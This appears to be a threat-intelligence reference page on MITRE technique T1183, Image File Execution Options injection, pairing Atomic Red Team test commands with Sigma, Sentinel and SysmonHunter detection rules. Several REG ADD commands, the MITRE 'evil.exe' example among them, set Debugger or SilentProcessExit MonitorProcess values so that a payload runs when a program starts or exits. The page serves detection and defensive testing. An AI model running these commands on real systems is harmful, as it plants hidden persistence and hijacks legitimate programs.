
# Image File Execution Options Injection

## Description

### MITRE Description

> Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)

IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)

* <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512</code>
* <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1</code>
* <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"</code>

Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.

Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Autoruns Analysis']
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'SYSTEM']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1183

## Potential Commands

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\C:\Windows\System32\calc.exe" /v Debugger /d "#{payload_binary}"

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v Debugger /d "C:\Windows\System32\cmd.exe"

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\C:\Windows\System32\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\C:\Windows\System32\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\C:\Windows\System32\notepad.exe" /v MonitorProcess /d "#{payload_binary}"

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "C:\Windows\System32\cmd.exe"

Microsoft\Windows NT\CurrentVersion\Image File Execution Options\|SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit
Microsoft\Windows NT\CurrentVersion\Image File Execution Options\|SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit
```

## Commands Dataset

```
[{'command': 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution '
             'Options\\C:\\Windows\\System32\\calc.exe" /v Debugger /d '
             '"#{payload_binary}"\n',
  'name': None,
  'source': 'atomics/T1183/T1183.yaml'},
 {'command': 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution '
             'Options\\#{target_binary}" /v Debugger /d '
             '"C:\\Windows\\System32\\cmd.exe"\n',
  'name': None,
  'source': 'atomics/T1183/T1183.yaml'},
 {'command': 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution '
             'Options\\C:\\Windows\\System32\\notepad.exe" /v GlobalFlag /t '
             'REG_DWORD /d 512\n'
             'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe" '
             '/v ReportingMode /t REG_DWORD /d 1\n'
             'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe" '
             '/v MonitorProcess /d "#{payload_binary}"\n',
  'name': None,
  'source': 'atomics/T1183/T1183.yaml'},
 {'command': 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution '
             'Options\\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512\n'
             'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}" /v '
             'ReportingMode /t REG_DWORD /d 1\n'
             'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}" /v '
             'MonitorProcess /d "C:\\Windows\\System32\\cmd.exe"\n',
  'name': None,
  'source': 'atomics/T1183/T1183.yaml'},
 {'command': 'Microsoft\\Windows NT\\CurrentVersion\\Image File Execution '
             'Options\\|SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\SilentProcessExit',
  'name': None,
  'source': 'SysmonHunter - Image File Execution Options Injection'},
 {'command': 'Microsoft\\Windows NT\\CurrentVersion\\Image File Execution '
             'Options\\|SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\SilentProcessExit',
  'name': None,
  'source': 'SysmonHunter - Image File Execution Options Injection'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Karneades',
                  'date': '2018/04/11',
                  'description': 'Detects persistence registry keys',
                  'detection': {'condition': 'selection_reg1',
                                'selection_reg1': {'EventID': 13,
                                                   'EventType': 'SetValue',
                                                   'TargetObject': ['*\\SOFTWARE\\Microsoft\\Windows '
                                                                    'NT\\CurrentVersion\\Image '
                                                                    'File '
                                                                    'Execution '
                                                                    'Options\\\\*\\GlobalFlag',
                                                                    '*\\SOFTWARE\\Microsoft\\Windows '
                                                                    'NT\\CurrentVersion\\SilentProcessExit\\\\*\\ReportingMode',
                                                                    '*\\SOFTWARE\\Microsoft\\Windows '
                                                                    'NT\\CurrentVersion\\SilentProcessExit\\\\*\\MonitorProcess']}},
                  'falsepositives': ['unknown'],
                  'id': '36803969-5421-41ec-b92f-8500f79c23b0',
                  'level': 'critical',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/'],
                  'tags': ['attack.privilege_escalation',
                           'attack.persistence',
                           'attack.defense_evasion',
                           'attack.t1183',
                           'car.2013-01-002'],
                  'title': 'Registry Persistence Mechanisms'}},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['Windows event logs']},
 {'data_source': ['LMD - Autoruns']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Windows Registry']},
 {'data_source': ['Windows event logs']},
 {'data_source': ['LOG-MD - Autoruns']}]
```

## Potential Queries

```json
[{'name': 'Image File Execution Options Injection',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and '
           '(registry_key_path contains "\\\\Software\\\\Microsoft\\\\Windows '
           'NT\\\\CurrentVersion\\\\Image File Execution Options\\\\"or '
           'registry_key_path contains '
           '"\\\\Wow6432Node\\\\Microsoft\\\\Windows '
           'NT\\\\CurrentVersion\\\\Image File Execution Options\\\\")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Image File Execution Options': {'atomic_tests': [{'auto_generated_guid': 'fdda2626-5234-4c90-b163-60849a24c0b8',
                                                                            'description': 'Leverage '
                                                                                           'Global '
                                                                                           'Flags '
                                                                                           'Settings\n',
                                                                            'executor': {'cleanup_command': 'reg '
                                                                                                            'delete '
                                                                                                            '"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows '
                                                                                                            'NT\\CurrentVersion\\Image '
                                                                                                            'File '
                                                                                                            'Execution '
                                                                                                            'Options\\#{target_binary}" '
                                                                                                            '/v '
                                                                                                            'Debugger '
                                                                                                            '/f '
                                                                                                            '>nul '
                                                                                                            '2>&1\n',
                                                                                         'command': 'REG '
                                                                                                    'ADD '
                                                                                                    '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                    'NT\\CurrentVersion\\Image '
                                                                                                    'File '
                                                                                                    'Execution '
                                                                                                    'Options\\#{target_binary}" '
                                                                                                    '/v '
                                                                                                    'Debugger '
                                                                                                    '/d '
                                                                                                    '"#{payload_binary}"\n',
                                                                                         'elevation_required': True,
                                                                                         'name': 'command_prompt'},
                                                                            'input_arguments': {'payload_binary': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                                   'description': 'Binary '
                                                                                                                                  'To '
                                                                                                                                  'Execute',
                                                                                                                   'type': 'Path'},
                                                                                                'target_binary': {'default': 'C:\\Windows\\System32\\calc.exe',
                                                                                                                  'description': 'Binary '
                                                                                                                                 'To '
                                                                                                                                 'Attach '
                                                                                                                                 'To',
                                                                                                                  'type': 'Path'}},
                                                                            'name': 'IFEO '
                                                                                    'Add '
                                                                                    'Debugger',
                                                                            'supported_platforms': ['windows']},
                                                                           {'auto_generated_guid': '46b1f278-c8ee-4aa5-acce-65e77b11f3c1',
                                                                            'description': 'Leverage '
                                                                                           'Global '
                                                                                           'Flags '
                                                                                           'Settings\n',
                                                                            'executor': {'cleanup_command': 'reg '
                                                                                                            'delete '
                                                                                                            '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                            'NT\\CurrentVersion\\Image '
                                                                                                            'File '
                                                                                                            'Execution '
                                                                                                            'Options\\#{target_binary}" '
                                                                                                            '/v '
                                                                                                            'GlobalFlag '
                                                                                                            '/f '
                                                                                                            '>nul '
                                                                                                            '2>&1\n'
                                                                                                            'reg '
                                                                                                            'delete '
                                                                                                            '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                            'NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}" '
                                                                                                            '/v '
                                                                                                            'ReportingMode '
                                                                                                            '/f '
                                                                                                            '>nul '
                                                                                                            '2>&1\n'
                                                                                                            'reg '
                                                                                                            'delete '
                                                                                                            '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                            'NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}" '
                                                                                                            '/v '
                                                                                                            'MonitorProcess '
                                                                                                            '/f '
                                                                                                            '>nul '
                                                                                                            '2>&1\n',
                                                                                         'command': 'REG '
                                                                                                    'ADD '
                                                                                                    '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                    'NT\\CurrentVersion\\Image '
                                                                                                    'File '
                                                                                                    'Execution '
                                                                                                    'Options\\#{target_binary}" '
                                                                                                    '/v '
                                                                                                    'GlobalFlag '
                                                                                                    '/t '
                                                                                                    'REG_DWORD '
                                                                                                    '/d '
                                                                                                    '512\n'
                                                                                                    'REG '
                                                                                                    'ADD '
                                                                                                    '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                    'NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}" '
                                                                                                    '/v '
                                                                                                    'ReportingMode '
                                                                                                    '/t '
                                                                                                    'REG_DWORD '
                                                                                                    '/d '
                                                                                                    '1\n'
                                                                                                    'REG '
                                                                                                    'ADD '
                                                                                                    '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                                                    'NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}" '
                                                                                                    '/v '
                                                                                                    'MonitorProcess '
                                                                                                    '/d '
                                                                                                    '"#{payload_binary}"\n',
                                                                                         'elevation_required': True,
                                                                                         'name': 'command_prompt'},
                                                                            'input_arguments': {'payload_binary': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                                   'description': 'Binary '
                                                                                                                                  'To '
                                                                                                                                  'Execute',
                                                                                                                   'type': 'Path'},
                                                                                                'target_binary': {'default': 'C:\\Windows\\System32\\notepad.exe',
                                                                                                                  'description': 'Binary '
                                                                                                                                 'To '
                                                                                                                                 'Attach '
                                                                                                                                 'To',
                                                                                                                  'type': 'Path'}},
                                                                            'name': 'IFEO '
                                                                                    'Global '
                                                                                    'Flags',
                                                                            'supported_platforms': ['windows']}],
                                                          'attack_technique': 'T1183',
                                                          'display_name': 'Image '
                                                                          'File '
                                                                          'Execution '
                                                                          'Options'}},
 {'SysmonHunter - T1183': {'description': None,
                           'level': 'medium',
                           'name': 'Image File Execution Options Injection',
                           'phase': 'Persistence',
                           'query': [{'reg': {'path': {'pattern': 'Microsoft\\Windows '
                                                                  'NT\\CurrentVersion\\Image '
                                                                  'File '
                                                                  'Execution '
                                                                  'Options\\|SOFTWARE\\Microsoft\\Windows '
                                                                  'NT\\CurrentVersion\\SilentProcessExit'}},
                                      'type': 'reg'},
                                     {'process': {'cmdline': {'pattern': 'Microsoft\\Windows '
                                                                         'NT\\CurrentVersion\\Image '
                                                                         'File '
                                                                         'Execution '
                                                                         'Options\\|SOFTWARE\\Microsoft\\Windows '
                                                                         'NT\\CurrentVersion\\SilentProcessExit'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Persistence](../tactics/Persistence.md)
    
* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations

None

# Actors


* [TEMP.Veles](../actors/TEMP.Veles.md)

